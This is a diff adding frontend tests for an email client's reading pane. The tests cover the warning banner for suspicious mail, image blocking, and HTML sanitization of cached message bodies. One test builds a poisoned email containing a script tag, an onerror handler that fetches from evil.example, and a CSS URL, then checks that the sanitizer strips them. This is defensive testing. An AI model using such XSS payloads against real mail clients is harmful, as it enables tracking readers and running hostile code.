@@ -407,3 +407,86 @@ describe("blocking the sender (E6, canon §2.2)", () => {
     ).not.toBeInTheDocument();
   });
 });
+
+describe("suspicious mail outside Junk (E10, canon §4.1.15)", () => {
+  const suspicious = () => message({ "moov:suspicious": true });
+
+  it("shows the warning banner with a report-spam action", () => {
+    renderPane({ email: suspicious() });
+    expect(screen.getByText("Este mensaje parece spam")).toBeInTheDocument();
+    // Twice on purpose, like Junk's pair: the banner (where the user is
+    // looking) and the toolbar (where the verb always lives).
+    expect(screen.getAllByRole("button", { name: /marcar como spam/i })).toHaveLength(2);
+  });
+
+  it("keeps every other affordance — the banner degrades, it does not hide", () => {
+    renderPane({ email: suspicious() });
+    // Reply stays primary; archive, delete, move all remain. Spot-check the
+    // representative pair rather than the whole toolbar.
+    expect(screen.getByRole("button", { name: "Responder" })).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: "Archivar" })).toBeInTheDocument();
+  });
+
+  it("removes the remote-image unblock entirely, exactly like Junk", () => {
+    renderPane({ email: suspicious() });
+    expect(screen.queryByRole("button", { name: /mostrar imágenes/i })).not.toBeInTheDocument();
+    // The count is still stated — silence would read as a rendering bug.
+    expect(screen.getByText(/imagen/i)).toBeInTheDocument();
+  });
+
+  it("wins over imagesPolicy 'always': the preference cannot override the stance", () => {
+    renderPane({ email: suspicious(), autoLoadImages: true });
+    const frame = document.querySelector("iframe");
+    expect(frame).not.toBeNull();
+    // The tracker URL from the fixture must be unfetchable: not in the doc.
+    expect(frame?.getAttribute("srcdoc") ?? "").not.toContain("tracker.example");
+  });
+
+  it("does not double-banner inside Junk — the spam banner already says it", () => {
+    renderPane({ email: suspicious(), inJunk: true, currentMailboxId: "junk" });
+    expect(screen.getByText("Este mensaje está en Spam")).toBeInTheDocument();
+    expect(screen.queryByText("Este mensaje parece spam")).not.toBeInTheDocument();
+  });
+
+  it("treats an absent verdict as clean — old cache entries and list rows", () => {
+    renderPane(); // the fixture has no moov:suspicious at all
+    expect(screen.queryByText("Este mensaje parece spam")).not.toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /mostrar imágenes/i })).toBeInTheDocument();
+  });
+});
+
+describe("the sanitize chokepoint holds for cache-shaped bodies (E10 / D-4, E9b)", () => {
+  /*
+   * An offline body re-renders from IndexedDB as an Email object fed through
+   * the SAME props as a network response — there is no separate "cached"
+   * render path. This test feeds the reader a poisoned Email of exactly that
+   * shape (script, event handler, external image) and pins that the rendered
+   * frame contains none of it: a poisoned cache entry is still sanitized ON
+   * RENDER, never trusted for having been stored by us.
+   */
+  it("sanitizes a poisoned body on render rather than trusting the cache", () => {
+    renderPane({
+      email: message({
+        bodyValues: {
+          "1": {
+            value:
+              '<p>ok</p><script>document.title="pwned"</script>' +
+              '<img src="https://evil.example/x.gif" onerror="fetch(\'https://evil.example/c\')">' +
+              '<div style="background: url(https://evil.example/css)">t</div>',
+            isEncodingProblem: false,
+            isTruncated: false,
+          },
+        },
+      }),
+    });
+    const frame = document.querySelector("iframe");
+    expect(frame).not.toBeNull();
+    const doc = frame?.getAttribute("srcdoc") ?? "";
+    expect(doc).not.toContain("<script");
+    expect(doc).not.toContain("onerror");
+    expect(doc).not.toContain("evil.example");
+    expect(doc).toContain("ok");
+    // The frame's sandbox is the layer that holds if the sanitizer fails.
+    expect(frame?.getAttribute("sandbox")).toBe("allow-popups allow-popups-to-escape-sandbox");
+  });
+});
